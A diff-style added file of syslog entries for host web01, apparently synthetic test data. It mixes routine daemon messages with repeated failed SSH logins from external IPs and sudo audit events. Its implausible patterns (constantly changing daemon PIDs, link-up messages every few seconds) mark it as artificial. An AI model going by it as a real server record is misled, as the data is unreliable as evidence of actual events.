+Aug 20 01:25:29 web01 CRON[843]: (root) CMD (/usr/local/bin/php -f /var/www/html/cron.php)
+Aug 20 01:25:32 web01 kernel[0]: audit: backlog limit exceeded
+Aug 20 01:25:37 web01 postfix/smtpd[3379]: disconnect from localhost[127.0.0.1] ehlo=1 mail=1 rcpt=1 data=1 quit=1 commands=5
+Aug 20 01:25:39 web01 sshd[1281]: Failed password for invalid user user from 185.158.106.77 port 57900 ssh2 event=LOGIN_FAILED
+Aug 20 01:25:45 web01 apt[3976]: Cache clean: removing index files
+Aug 20 01:25:51 web01 dbus-daemon[1209]: systemd-logind: New session started
+Aug 20 01:25:54 web01 dbus-daemon[696]: systemd-logind: New session started
+Aug 20 01:25:56 web01 kernel[0]: eth0: link is up at 1000 Mbps full-duplex
+Aug 20 01:25:58 web01 kernel[0]: audit: backlog limit exceeded
+Aug 20 01:26:05 web01 kernel[0]: eth0: link is up at 1000 Mbps full-duplex
+Aug 20 01:26:11 web01 NetworkManager[924]: DHCPv4 lease renewed on eth0
+Aug 20 01:26:15 web01 nginx[2560]: 200 0.838 - GET / HTTP/1.1 "-" "Mozilla/5.0"
+Aug 20 01:26:18 web01 CRON[929]: (www-data) CMD (/usr/local/bin/php -f /var/www/html/cron.php)
+Aug 20 01:26:22 web01 avahi-daemon[745]: Registering new address record for fe80::/64 on eth0.*.
+Aug 20 01:26:29 web01 CRON[773]: (root) CMD (/usr/local/bin/php -f /var/www/html/cron.php)
+Aug 20 01:26:35 web01 systemd[1]: Started Daily apt download activities.
+Aug 20 01:26:41 web01 kernel[0]: eth0: link is up at 1000 Mbps full-duplex
+Aug 20 01:26:43 web01 CRON[938]: (www-data) CMD (/usr/local/bin/php -f /var/www/html/cron.php)
+Aug 20 01:26:48 web01 NetworkManager[740]: DHCPv4 lease renewed on eth0
+Aug 20 01:26:49 web01 dbus-daemon[1100]: systemd-logind: New session started
+Aug 20 01:26:51 web01 kernel[0]: eth0: link is up at 1000 Mbps full-duplex
+Aug 20 01:26:57 web01 kernel[0]: eth0: link is up at 1000 Mbps full-duplex
+Aug 20 01:27:01 web01 nginx[2205]: 200 0.583 - GET / HTTP/1.1 "-" "Mozilla/5.0"
+Aug 20 01:27:07 web01 apt[2510]: Cache clean: removing index files
+Aug 20 01:27:12 web01 kernel[0]: audit: backlog limit exceeded
+Aug 20 01:27:16 web01 dbus-daemon[1401]: systemd-logind: New session started
+Aug 20 01:27:20 web01 sshd[1246]: Failed password for invalid user admin from 185.158.106.77 port 50524 ssh2 event=LOGIN_FAILED
+Aug 20 01:27:26 web01 systemd[1]: Started Daily apt download activities.
+Aug 20 01:27:32 web01 systemd[1]: Rotate log files.
+Aug 20 01:27:34 web01 postfix/smtpd[3257]: disconnect from localhost[127.0.0.1] ehlo=1 mail=1 rcpt=1 data=1 quit=1 commands=5
+Aug 20 01:27:36 web01 kernel[0]: audit: backlog limit exceeded
+Aug 20 01:27:43 web01 postfix/smtpd[2907]: disconnect from localhost[127.0.0.1] ehlo=1 mail=1 rcpt=1 data=1 quit=1 commands=5
+Aug 20 01:27:45 web01 kernel[0]: audit: backlog limit exceeded
+Aug 20 01:27:46 web01 systemd[1]: Started Daily apt download activities.
+Aug 20 01:27:49 web01 kernel[0]: eth0: link is up at 1000 Mbps full-duplex
+Aug 20 01:27:51 web01 audit[1217]: user=ubuntu exe="/usr/bin/sudo" args="ls /root" event=AUDIT
+Aug 20 01:27:53 web01 avahi-daemon[519]: Registering new address record for fe80::/64 on eth0.*.
+Aug 20 01:27:55 web01 apt[3827]: Cache clean: removing index files
+Aug 20 01:27:58 web01 NetworkManager[614]: DHCPv4 lease renewed on eth0
+Aug 20 01:28:04 web01 nginx[3162]: 200 0.402 - GET / HTTP/1.1 "-" "Mozilla/5.0"
+Aug 20 01:28:10 web01 apt[2859]: Cache clean: removing index files
+Aug 20 01:28:15 web01 audit[3487]: user=ubuntu exe="/usr/bin/sudo" args="ls /root" event=AUDIT
+Aug 20 01:28:19 web01 sshd[1148]: Accepted publickey for ubuntu from 10.0.5.44 port 60965 ssh2 event=LOGIN_SUCCESS
+Aug 20 01:28:21 web01 kernel[0]: audit: backlog limit exceeded
+Aug 20 01:28:24 web01 kernel[0]: audit: backlog limit exceeded
+Aug 20 01:28:27 web01 postfix/smtpd[2857]: disconnect from localhost[127.0.0.1] ehlo=1 mail=1 rcpt=1 data=1 quit=1 commands=5
+Aug 20 01:28:34 web01 kernel[0]: eth0: link is up at 1000 Mbps full-duplex
+Aug 20 01:28:37 web01 systemd[1]: Rotate log files.
+Aug 20 01:28:40 web01 dbus-daemon[1209]: systemd-logind: New session started
+Aug 20 01:28:42 web01 systemd[1]: Started Daily apt download activities.
+Aug 20 01:28:46 web01 nginx[3029]: 200 0.515 - GET / HTTP/1.1 "-" "Mozilla/5.0"
+Aug 20 01:28:52 web01 apt[3913]: Cache clean: removing index files
+Aug 20 01:28:53 web01 dbus-daemon[1463]: systemd-logind: New session started
+Aug 20 01:28:56 web01 postfix/smtpd[2626]: disconnect from localhost[127.0.0.1] ehlo=1 mail=1 rcpt=1 data=1 quit=1 commands=5
+Aug 20 01:28:58 web01 kernel[0]: audit: backlog limit exceeded
+Aug 20 01:29:00 web01 sshd[1459]: Failed password for invalid user user from 185.158.106.77 port 53626 ssh2 event=LOGIN_FAILED
+Aug 20 01:29:05 web01 kernel[0]: audit: backlog limit exceeded
+Aug 20 01:29:12 web01 kernel[0]: eth0: link is up at 1000 Mbps full-duplex
+Aug 20 01:29:17 web01 sshd[1388]: Failed password for invalid user user from 185.158.106.77 port 42559 ssh2 event=LOGIN_FAILED
+Aug 20 01:29:18 web01 systemd[1]: Started Daily apt download activities.
+Aug 20 01:29:23 web01 sshd[1366]: Accepted publickey for ubuntu from 10.0.3.11 port 63999 ssh2 event=LOGIN_SUCCESS
+Aug 20 01:29:27 web01 systemd[1]: Started Daily apt download activities.
+Aug 20 01:29:33 web01 systemd[1]: Rotate log files.
+Aug 20 01:29:38 web01 sshd[1362]: Failed password for invalid user admin from 89.248.165.114 port 44323 ssh2 event=LOGIN_FAILED
+Aug 20 01:29:42 web01 sshd[1444]: Failed password for invalid user admin from 185.220.101.17 port 55151 ssh2 event=LOGIN_FAILED
+Aug 20 01:29:49 web01 nginx[2810]: 200 0.122 - GET / HTTP/1.1 "-" "Mozilla/5.0"
+Aug 20 01:29:52 web01 avahi-daemon[731]: Registering new address record for fe80::/64 on eth0.*.
+Aug 20 01:29:54 web01 systemd[1]: Rotate log files.
+Aug 20 01:29:58 web01 nginx[3108]: 200 0.165 - GET / HTTP/1.1 "-" "Mozilla/5.0"
+Aug 20 01:29:59 web01 kernel[0]: audit: backlog limit exceeded
+Aug 20 01:30:03 web01 systemd[1]: Started Daily apt download activities.
+Aug 20 01:30:05 web01 apt[4068]: Cache clean: removing index files
+Aug 20 01:30:11 web01 kernel[0]: audit: backlog limit exceeded
+Aug 20 01:30:14 web01 kernel[0]: audit: backlog limit exceeded
+Aug 20 01:30:18 web01 audit[1638]: user=ubuntu exe="/usr/bin/sudo" args="ls /root" event=AUDIT
+Aug 20 01:30:19 web01 NetworkManager[1152]: DHCPv4 lease renewed on eth0
+Aug 20 01:30:21 web01 dbus-daemon[856]: systemd-logind: New session started
+Aug 20 01:30:22 web01 CRON[835]: (www-data) CMD (/usr/local/bin/php -f /var/www/html/cron.php)
+Aug 20 01:30:24 web01 apt[2956]: Cache clean: removing index files
+Aug 20 01:30:31 web01 systemd[1]: Started Daily apt download activities.
+Aug 20 01:30:34 web01 sshd[1372]: Failed password for invalid user user from 185.220.101.17 port 53897 ssh2 event=LOGIN_FAILED
+Aug 20 01:30:38 web01 avahi-daemon[476]: Registering new address record for fe80::/64 on eth0.*.
+Aug 20 01:30:42 web01 nginx[2386]: 200 0.382 - GET / HTTP/1.1 "-" "Mozilla/5.0"
+Aug 20 01:30:48 web01 apt[2565]: Cache clean: removing index files
+Aug 20 01:30:55 web01 NetworkManager[616]: DHCPv4 lease renewed on eth0
+Aug 20 01:30:57 web01 CRON[852]: (root) CMD (/usr/local/bin/php -f /var/www/html/cron.php)
+Aug 20 01:30:58 web01 sshd[1479]: Failed password for invalid user user from 45.155.23.87 port 48019 ssh2 event=LOGIN_FAILED
+Aug 20 01:30:59 web01 postfix/smtpd[2639]: disconnect from localhost[127.0.0.1] ehlo=1 mail=1 rcpt=1 data=1 quit=1 commands=5
+Aug 20 01:31:04 web01 CRON[735]: (root) CMD (/usr/local/bin/php -f /var/www/html/cron.php)
+Aug 20 01:31:09 web01 kernel[0]: audit: backlog limit exceeded
+Aug 20 01:31:16 web01 kernel[0]: audit: backlog limit exceeded
+Aug 20 01:31:21 web01 systemd[1]: Rotate log files.
+Aug 20 01:31:23 web01 nginx[3067]: 200 0.246 - GET / HTTP/1.1 "-" "Mozilla/5.0"
+Aug 20 01:31:25 web01 postfix/smtpd[2681]: disconnect from localhost[127.0.0.1] ehlo=1 mail=1 rcpt=1 data=1 quit=1 commands=5
+Aug 20 01:31:26 web01 systemd[1]: Rotate log files.
+Aug 20 01:31:32 web01 NetworkManager[1169]: DHCPv4 lease renewed on eth0
+Aug 20 01:31:36 web01 systemd[1]: Started Daily apt download activities.
+Aug 20 01:31:42 web01 NetworkManager[1137]: DHCPv4 lease renewed on eth0
+Aug 20 01:31:45 web01 NetworkManager[1018]: DHCPv4 lease renewed on eth0
+Aug 20 01:31:47 web01 kernel[0]: eth0: link is up at 1000 Mbps full-duplex
+Aug 20 01:31:54 web01 sshd[1462]: Accepted publickey for ubuntu from 10.0.4.17 port 54927 ssh2 event=LOGIN_SUCCESS
+Aug 20 01:31:56 web01 avahi-daemon[379]: Registering new address record for fe80::/64 on eth0.*.
+Aug 20 01:32:01 web01 postfix/smtpd[2826]: disconnect from localhost[127.0.0.1] ehlo=1 mail=1 rcpt=1 data=1 quit=1 commands=5
+Aug 20 01:32:06 web01 sshd[1204]: Accepted publickey for deploy from 10.0.4.17 port 54177 ssh2 event=LOGIN_SUCCESS
+Aug 20 01:32:09 web01 dbus-daemon[1444]: systemd-logind: New session started
+Aug 20 01:32:13 web01 audit[2293]: user=root exe="/usr/bin/sudo" args="ls /root" event=AUDIT
+Aug 20 01:32:19 web01 avahi-daemon[376]: Registering new address record for fe80::/64 on eth0.*.
+Aug 20 01:32:22 web01 postfix/smtpd[3019]: disconnect from localhost[127.0.0.1] ehlo=1 mail=1 rcpt=1 data=1 quit=1 commands=5
+Aug 20 01:32:27 web01 systemd[1]: Started Daily apt download activities.
+Aug 20 01:32:29 web01 avahi-daemon[650]: Registering new address record for fe80::/64 on eth0.*.
+Aug 20 01:32:35 web01 NetworkManager[822]: DHCPv4 lease renewed on eth0
+Aug 20 01:32:39 web01 CRON[777]: (www-data) CMD (/usr/local/bin/php -f /var/www/html/cron.php)
+Aug 20 01:32:40 web01 CRON[946]: (root) CMD (/usr/local/bin/php -f /var/www/html/cron.php)
+Aug 20 01:32:46 web01 systemd[1]: Started Daily apt download activities.
+Aug 20 01:32:48 web01 NetworkManager[809]: DHCPv4 lease renewed on eth0
+Aug 20 01:32:52 web01 kernel[0]: audit: backlog limit exceeded
+Aug 20 01:32:59 web01 kernel[0]: eth0: link is up at 1000 Mbps full-duplex
+Aug 20 01:33:04 web01 dbus-daemon[815]: systemd-logind: New session started
+Aug 20 01:33:07 web01 nginx[2954]: 200 0.609 - GET / HTTP/1.1 "-" "Mozilla/5.0"
+Aug 20 01:33:08 web01 avahi-daemon[719]: Registering new address record for fe80::/64 on eth0.*.
+Aug 20 01:33:12 web01 apt[3155]: Cache clean: removing index files
+Aug 20 01:33:14 web01 postfix/smtpd[2823]: disconnect from localhost[127.0.0.1] ehlo=1 mail=1 rcpt=1 data=1 quit=1 commands=5
+Aug 20 01:33:15 web01 systemd[1]: Rotate log files.
+Aug 20 01:33:21 web01 CRON[841]: (www-data) CMD (/usr/local/bin/php -f /var/www/html/cron.php)
+Aug 20 01:33:26 web01 systemd[1]: Rotate log files.
+Aug 20 01:33:29 web01 CRON[758]: (www-data) CMD (/usr/local/bin/php -f /var/www/html/cron.php)
+Aug 20 01:33:33 web01 systemd[1]: Rotate log files.
+Aug 20 01:33:37 web01 systemd[1]: Rotate log files.
+Aug 20 01:33:40 web01 apt[3500]: Cache clean: removing index files
+Aug 20 01:33:46 web01 dbus-daemon[1002]: systemd-logind: New session started
+Aug 20 01:33:50 web01 CRON[743]: (www-data) CMD (/usr/local/bin/php -f /var/www/html/cron.php)
+Aug 20 01:33:52 web01 apt[3500]: Cache clean: removing index files
+Aug 20 01:33:54 web01 kernel[0]: audit: backlog limit exceeded
+Aug 20 01:33:59 web01 systemd[1]: Started Daily apt download activities.
+Aug 20 01:34:06 web01 NetworkManager[606]: DHCPv4 lease renewed on eth0
+Aug 20 01:34:10 web01 CRON[717]: (root) CMD (/usr/local/bin/php -f /var/www/html/cron.php)
+Aug 20 01:34:16 web01 CRON[829]: (root) CMD (/usr/local/bin/php -f /var/www/html/cron.php)
+Aug 20 01:34:20 web01 postfix/smtpd[3032]: disconnect from localhost[127.0.0.1] ehlo=1 mail=1 rcpt=1 data=1 quit=1 commands=5
+Aug 20 01:34:26 web01 NetworkManager[1094]: DHCPv4 lease renewed on eth0
+Aug 20 01:34:32 web01 sshd[1310]: Failed password for invalid user admin from 185.220.101.17 port 58076 ssh2 event=LOGIN_FAILED
+Aug 20 01:34:33 web01 systemd[1]: Started Daily apt download activities.
+Aug 20 01:34:38 web01 kernel[0]: audit: backlog limit exceeded
+Aug 20 01:34:43 web01 avahi-daemon[695]: Registering new address record for fe80::/64 on eth0.*.
+Aug 20 01:34:47 web01 avahi-daemon[441]: Registering new address record for fe80::/64 on eth0.*.
+Aug 20 01:34:48 web01 kernel[0]: audit: backlog limit exceeded
+Aug 20 01:34:50 web01 CRON[908]: (www-data) CMD (/usr/local/bin/php -f /var/www/html/cron.php)
+Aug 20 01:34:53 web01 kernel[0]: eth0: link is up at 1000 Mbps full-duplex
+Aug 20 01:34:54 web01 postfix/smtpd[2815]: disconnect from localhost[127.0.0.1] ehlo=1 mail=1 rcpt=1 data=1 quit=1 commands=5
+Aug 20 01:34:58 web01 systemd[1]: Rotate log files.
+Aug 20 01:35:01 web01 NetworkManager[682]: DHCPv4 lease renewed on eth0
+Aug 20 01:35:07 web01 kernel[0]: audit: backlog limit exceeded
+Aug 20 01:35:08 web01 postfix/smtpd[2786]: disconnect from localhost[127.0.0.1] ehlo=1 mail=1 rcpt=1 data=1 quit=1 commands=5
+Aug 20 01:35:13 web01 sshd[1187]: Failed password for invalid user user from 45.155.23.87 port 63030 ssh2 event=LOGIN_FAILED
+Aug 20 01:35:14 web01 sshd[1148]: Failed password for invalid user test from 185.158.106.77 port 58541 ssh2 event=LOGIN_FAILED
+Aug 20 01:35:19 web01 kernel[0]: audit: backlog limit exceeded
+Aug 20 01:35:21 web01 kernel[0]: audit: backlog limit exceeded
+Aug 20 01:35:24 web01 systemd[1]: Started Daily apt download activities.
+Aug 20 01:35:30 web01 kernel[0]: audit: backlog limit exceeded
+Aug 20 01:35:32 web01 kernel[0]: audit: backlog limit exceeded
+Aug 20 01:35:33 web01 kernel[0]: audit: backlog limit exceeded
+Aug 20 01:35:40 web01 avahi-daemon[770]: Registering new address record for fe80::/64 on eth0.*.
+Aug 20 01:35:44 web01 kernel[0]: audit: backlog limit exceeded
+Aug 20 01:35:46 web01 systemd[1]: Rotate log files.
+Aug 20 01:35:52 web01 audit[1672]: user=svc.backup exe="/usr/bin/sudo" args="ls /root" event=AUDIT
+Aug 20 01:35:59 web01 apt[4118]: Cache clean: removing index files
+Aug 20 01:36:05 web01 apt[3525]: Cache clean: removing index files
+Aug 20 01:36:11 web01 kernel[0]: audit: backlog limit exceeded
+Aug 20 01:36:12 web01 sshd[1493]: Failed password for invalid user admin from 185.158.106.77 port 59830 ssh2 event=LOGIN_FAILED
+Aug 20 01:36:17 web01 kernel[0]: audit: backlog limit exceeded
+Aug 20 01:36:24 web01 nginx[2559]: 200 0.749 - GET / HTTP/1.1 "-" "Mozilla/5.0"
+Aug 20 01:36:31 web01 kernel[0]: audit: backlog limit exceeded
+Aug 20 01:36:33 web01 nginx[2884]: 200 0.484 - GET / HTTP/1.1 "-" "Mozilla/5.0"
+Aug 20 01:36:35 web01 NetworkManager[989]: DHCPv4 lease renewed on eth0
+Aug 20 01:36:36 web01 apt[3104]: Cache clean: removing index files
+Aug 20 01:36:43 web01 kernel[0]: eth0: link is up at 1000 Mbps full-duplex
+Aug 20 01:36:44 web01 kernel[0]: eth0: link is up at 1000 Mbps full-duplex
+Aug 20 01:36:50 web01 avahi-daemon[428]: Registering new address record for fe80::/64 on eth0.*.
+Aug 20 01:36:56 web01 postfix/smtpd[2769]: disconnect from localhost[127.0.0.1] ehlo=1 mail=1 rcpt=1 data=1 quit=1 commands=5
+Aug 20 01:36:57 web01 systemd[1]: Started Daily apt download activities.
+Aug 20 01:37:01 web01 nginx[2209]: 200 0.376 - GET / HTTP/1.1 "-" "Mozilla/5.0"
+Aug 20 01:37:03 web01 systemd[1]: Started Daily apt download activities.
+Aug 20 01:37:07 web01 systemd[1]: Rotate log files.
+Aug 20 01:37:08 web01 systemd[1]: Started Daily apt download activities.
+Aug 20 01:37:13 web01 systemd[1]: Started Daily apt download activities.
+Aug 20 01:37:20 web01 postfix/smtpd[2698]: disconnect from localhost[127.0.0.1] ehlo=1 mail=1 rcpt=1 data=1 quit=1 commands=5
+Aug 20 01:37:24 web01 postfix/smtpd[2486]: disconnect from localhost[127.0.0.1] ehlo=1 mail=1 rcpt=1 data=1 quit=1 commands=5
+Aug 20 01:37:30 web01 kernel[0]: audit: backlog limit exceeded
+Aug 20 01:37:35 web01 sshd[1237]: Accepted publickey for deploy from 10.0.4.17 port 52274 ssh2 event=LOGIN_SUCCESS
+Aug 20 01:37:38 web01 kernel[0]: eth0: link is up at 1000 Mbps full-duplex
+Aug 20 01:37:39 web01 CRON[807]: (www-data) CMD (/usr/local/bin/php -f /var/www/html/cron.php)
+Aug 20 01:37:42 web01 sshd[1226]: Failed password for invalid user admin from 185.158.106.77 port 48247 ssh2 event=LOGIN_FAILED
+Aug 20 01:37:48 web01 dbus-daemon[1108]: systemd-logind: New session started
+Aug 20 01:37:53 web01 CRON[734]: (root) CMD (/usr/local/bin/php -f /var/www/html/cron.php)
+Aug 20 01:37:56 web01 systemd[1]: Started Daily apt download activities.
+Aug 20 01:37:59 web01 audit[3393]: user=ubuntu exe="/usr/bin/sudo" args="ls /root" event=AUDIT
+Aug 20 01:38:06 web01 nginx[2881]: 200 0.442 - GET / HTTP/1.1 "-" "Mozilla/5.0"
+Aug 20 01:38:13 web01 avahi-daemon[683]: Registering new address record for fe80::/64 on eth0.*.
+Aug 20 01:38:18 web01 CRON[854]: (www-data) CMD (/usr/local/bin/php -f /var/www/html/cron.php)
+Aug 20 01:38:24 web01 CRON[745]: (www-data) CMD (/usr/local/bin/php -f /var/www/html/cron.php)
+Aug 20 01:38:28 web01 kernel[0]: audit: backlog limit exceeded
+Aug 20 01:38:34 web01 NetworkManager[1102]: DHCPv4 lease renewed on eth0
+Aug 20 01:38:39 web01 avahi-daemon[516]: Registering new address record for fe80::/64 on eth0.*.
+Aug 20 01:38:43 web01 kernel[0]: eth0: link is up at 1000 Mbps full-duplex
+Aug 20 01:38:46 web01 systemd[1]: Started Daily apt download activities.
+Aug 20 01:38:51 web01 kernel[0]: audit: backlog limit exceeded
+Aug 20 01:38:57 web01 apt[2555]: Cache clean: removing index files
+Aug 20 01:39:03 web01 sshd[1249]: Failed password for invalid user user from 185.92.220.41 port 54367 ssh2 event=LOGIN_FAILED
+Aug 20 01:39:10 web01 NetworkManager[1018]: DHCPv4 lease renewed on eth0
+Aug 20 01:39:16 web01 sshd[1229]: Failed password for invalid user user from 185.158.106.77 port 47930 ssh2 event=LOGIN_FAILED
+Aug 20 01:39:22 web01 CRON[902]: (www-data) CMD (/usr/local/bin/php -f /var/www/html/cron.php)
+Aug 20 01:39:26 web01 systemd[1]: Started Daily apt download activities.
+Aug 20 01:39:31 web01 postfix/smtpd[2918]: disconnect from localhost[127.0.0.1] ehlo=1 mail=1 rcpt=1 data=1 quit=1 commands=5
+Aug 20 01:39:38 web01 NetworkManager[1156]: DHCPv4 lease renewed on eth0
+Aug 20 01:39:39 web01 avahi-daemon[534]: Registering new address record for fe80::/64 on eth0.*.
+Aug 20 01:39:45 web01 audit[2532]: user=alex exe="/usr/bin/sudo" args="ls /root" event=AUDIT
+Aug 20 01:39:51 web01 kernel[0]: audit: backlog limit exceeded
+Aug 20 01:39:58 web01 kernel[0]: eth0: link is up at 1000 Mbps full-duplex
+Aug 20 01:40:00 web01 dbus-daemon[545]: systemd-logind: New session started
+Aug 20 01:40:05 web01 kernel[0]: audit: backlog limit exceeded
+Aug 20 01:40:12 web01 nginx[2216]: 200 0.540 - GET / HTTP/1.1 "-" "Mozilla/5.0"
+Aug 20 01:40:13 web01 systemd[1]: Started Daily apt download activities.
+Aug 20 01:40:18 web01 apt[3642]: Cache clean: removing index files
+Aug 20 01:40:23 web01 NetworkManager[826]: DHCPv4 lease renewed on eth0
+Aug 20 01:40:27 web01 postfix/smtpd[2874]: disconnect from localhost[127.0.0.1] ehlo=1 mail=1 rcpt=1 data=1 quit=1 commands=5
+Aug 20 01:40:34 web01 NetworkManager[1112]: DHCPv4 lease renewed on eth0
+Aug 20 01:40:36 web01 nginx[2988]: 200 0.125 - GET / HTTP/1.1 "-" "Mozilla/5.0"
+Aug 20 01:40:37 web01 kernel[0]: eth0: link is up at 1000 Mbps full-duplex
+Aug 20 01:40:38 web01 avahi-daemon[723]: Registering new address record for fe80::/64 on eth0.*.
+Aug 20 01:40:40 web01 nginx[2932]: 200 0.451 - GET / HTTP/1.1 "-" "Mozilla/5.0"
+Aug 20 01:40:47 web01 CRON[789]: (www-data) CMD (/usr/local/bin/php -f /var/www/html/cron.php)
+Aug 20 01:40:51 web01 systemd[1]: Started Daily apt download activities.
+Aug 20 01:40:54 web01 systemd[1]: Started Daily apt download activities.
+Aug 20 01:41:01 web01 NetworkManager[623]: DHCPv4 lease renewed on eth0
+Aug 20 01:41:08 web01 nginx[2336]: 200 0.211 - GET / HTTP/1.1 "-" "Mozilla/5.0"
+Aug 20 01:41:14 web01 kernel[0]: eth0: link is up at 1000 Mbps full-duplex
+Aug 20 01:41:19 web01 CRON[945]: (www-data) CMD (/usr/local/bin/php -f /var/www/html/cron.php)
+Aug 20 01:41:23 web01 kernel[0]: eth0: link is up at 1000 Mbps full-duplex
+Aug 20 01:41:29 web01 CRON[801]: (www-data) CMD (/usr/local/bin/php -f /var/www/html/cron.php)
+Aug 20 01:41:30 web01 apt[2904]: Cache clean: removing index files
+Aug 20 01:41:34 web01 systemd[1]: Rotate log files.
+Aug 20 01:41:35 web01 NetworkManager[810]: DHCPv4 lease renewed on eth0
+Aug 20 01:41:38 web01 apt[4156]: Cache clean: removing index files
+Aug 20 01:41:45 web01 systemd[1]: Started Daily apt download activities.
+Aug 20 01:41:52 web01 audit[1598]: user=www-data exe="/usr/bin/sudo" args="ls /root" event=AUDIT
+Aug 20 01:41:55 web01 CRON[767]: (root) CMD (/usr/local/bin/php -f /var/www/html/cron.php)
+Aug 20 01:42:01 web01 audit[2717]: user=alex exe="/usr/bin/sudo" args="ls /root" event=AUDIT
+Aug 20 01:42:04 web01 systemd[1]: Rotate log files.
+Aug 20 01:42:09 web01 systemd[1]: Started Daily apt download activities.
+Aug 20 01:42:16 web01 sshd[1402]: Failed password for invalid user admin from 185.158.106.77 port 60135 ssh2 event=LOGIN_FAILED
+Aug 20 01:42:17 web01 NetworkManager[920]: DHCPv4 lease renewed on eth0
+Aug 20 01:42:18 web01 kernel[0]: eth0: link is up at 1000 Mbps full-duplex
+Aug 20 01:42:20 web01 postfix/smtpd[2544]: disconnect from localhost[127.0.0.1] ehlo=1 mail=1 rcpt=1 data=1 quit=1 commands=5
+Aug 20 01:42:25 web01 postfix/smtpd[3010]: disconnect from localhost[127.0.0.1] ehlo=1 mail=1 rcpt=1 data=1 quit=1 commands=5
+Aug 20 01:42:27 web01 systemd[1]: Rotate log files.
+Aug 20 01:42:29 web01 sshd[1185]: Failed password for invalid user user from 185.92.220.41 port 58183 ssh2 event=LOGIN_FAILED
+Aug 20 01:42:33 web01 kernel[0]: eth0: link is up at 1000 Mbps full-duplex
+Aug 20 01:42:36 web01 audit[319]: user=alex exe="/usr/bin/sudo" args="ls /root" event=AUDIT
+Aug 20 01:42:43 web01 nginx[2992]: 200 0.109 - GET / HTTP/1.1 "-" "Mozilla/5.0"
+Aug 20 01:42:45 web01 CRON[946]: (www-data) CMD (/usr/local/bin/php -f /var/www/html/cron.php)
+Aug 20 01:42:50 web01 sshd[1351]: Accepted publickey for deploy from 10.0.5.44 port 61218 ssh2 event=LOGIN_SUCCESS
+Aug 20 01:42:54 web01 NetworkManager[1054]: DHCPv4 lease renewed on eth0
+Aug 20 01:42:58 web01 CRON[903]: (root) CMD (/usr/local/bin/php -f /var/www/html/cron.php)
+Aug 20 01:43:05 web01 kernel[0]: eth0: link is up at 1000 Mbps full-duplex
+Aug 20 01:43:08 web01 kernel[0]: eth0: link is up at 1000 Mbps full-duplex
+Aug 20 01:43:10 web01 avahi-daemon[639]: Registering new address record for fe80::/64 on eth0.*.
+Aug 20 01:43:16 web01 apt[3514]: Cache clean: removing index files
+Aug 20 01:43:21 web01 sshd[1378]: Accepted publickey for ubuntu from 10.0.3.11 port 62699 ssh2 event=LOGIN_SUCCESS
+Aug 20 01:43:28 web01 kernel[0]: audit: backlog limit exceeded
+Aug 20 01:43:35 web01 NetworkManager[1159]: DHCPv4 lease renewed on eth0
+Aug 20 01:43:37 web01 kernel[0]: audit: backlog limit exceeded
+Aug 20 01:43:43 web01 avahi-daemon[734]: Registering new address record for fe80::/64 on eth0.*.
+Aug 20 01:43:45 web01 kernel[0]: eth0: link is up at 1000 Mbps full-duplex
+Aug 20 01:43:49 web01 kernel[0]: eth0: link is up at 1000 Mbps full-duplex
+Aug 20 01:43:53 web01 audit[3276]: user=root exe="/usr/bin/sudo" args="ls /root" event=AUDIT
+Aug 20 01:44:00 web01 kernel[0]: eth0: link is up at 1000 Mbps full-duplex
+Aug 20 01:44:07 web01 NetworkManager[1038]: DHCPv4 lease renewed on eth0
+Aug 20 01:44:09 web01 dbus-daemon[1303]: systemd-logind: New session started
+Aug 20 01:44:11 web01 avahi-daemon[762]: Registering new address record for fe80::/64 on eth0.*.
+Aug 20 01:44:12 web01 systemd[1]: Rotate log files.
+Aug 20 01:44:17 web01 sshd[1393]: Accepted publickey for deploy from 10.0.3.11 port 54740 ssh2 event=LOGIN_SUCCESS
+Aug 20 01:44:20 web01 kernel[0]: audit: backlog limit exceeded
+Aug 20 01:44:22 web01 kernel[0]: audit: backlog limit exceeded
+Aug 20 01:44:23 web01 kernel[0]: audit: backlog limit exceeded
+Aug 20 01:44:29 web01 audit[699]: user=www-data exe="/usr/bin/sudo" args="ls /root" event=AUDIT
+Aug 20 01:44:35 web01 nginx[2804]: 200 0.353 - GET / HTTP/1.1 "-" "Mozilla/5.0"
+Aug 20 01:44:39 web01 CRON[860]: (www-data) CMD (/usr/local/bin/php -f /var/www/html/cron.php)
+Aug 20 01:44:43 web01 postfix/smtpd[2477]: disconnect from localhost[127.0.0.1] ehlo=1 mail=1 rcpt=1 data=1 quit=1 commands=5
+Aug 20 01:44:49 web01 avahi-daemon[743]: Registering new address record for fe80::/64 on eth0.*.
+Aug 20 01:44:50 web01 postfix/smtpd[3167]: disconnect from localhost[127.0.0.1] ehlo=1 mail=1 rcpt=1 data=1 quit=1 commands=5
+Aug 20 01:44:53 web01 NetworkManager[977]: DHCPv4 lease renewed on eth0
+Aug 20 01:44:57 web01 kernel[0]: audit: backlog limit exceeded
+Aug 20 01:45:02 web01 systemd[1]: Started Daily apt download activities.
+Aug 20 01:45:08 web01 kernel[0]: audit: backlog limit exceeded
+Aug 20 01:45:15 web01 systemd[1]: Started Daily apt download activities.
+Aug 20 01:45:17 web01 kernel[0]: audit: backlog limit exceeded
+Aug 20 01:45:21 web01 kernel[0]: eth0: link is up at 1000 Mbps full-duplex
+Aug 20 01:45:24 web01 systemd[1]: Rotate log files.
+Aug 20 01:45:29 web01 audit[1507]: user=sysop exe="/usr/bin/sudo" args="ls /root" event=AUDIT
+Aug 20 01:45:35 web01 apt[2594]: Cache clean: removing index files
+Aug 20 01:45:36 web01 dbus-daemon[1356]: systemd-logind: New session started
+Aug 20 01:45:40 web01 systemd[1]: Started Daily apt download activities.
+Aug 20 01:45:44 web01 sshd[1167]: Failed password for invalid user test from 185.92.220.41 port 62563 ssh2 event=LOGIN_FAILED
+Aug 20 01:45:50 web01 nginx[2191]: 200 0.380 - GET / HTTP/1.1 "-" "Mozilla/5.0"
+Aug 20 01:45:56 web01 postfix/smtpd[2484]: disconnect from localhost[127.0.0.1] ehlo=1 mail=1 rcpt=1 data=1 quit=1 commands=5
+Aug 20 01:45:59 web01 NetworkManager[769]: DHCPv4 lease renewed on eth0
+Aug 20 01:46:00 web01 postfix/smtpd[2712]: disconnect from localhost[127.0.0.1] ehlo=1 mail=1 rcpt=1 data=1 quit=1 commands=5
+Aug 20 01:46:06 web01 NetworkManager[839]: DHCPv4 lease renewed on eth0
+Aug 20 01:46:10 web01 dbus-daemon[1220]: systemd-logind: New session started
+Aug 20 01:46:11 web01 systemd[1]: Started Daily apt download activities.
+Aug 20 01:46:12 web01 CRON[832]: (root) CMD (/usr/local/bin/php -f /var/www/html/cron.php)
+Aug 20 01:46:18 web01 sshd[1316]: Failed password for invalid user admin from 185.158.106.77 port 43951 ssh2 event=LOGIN_FAILED
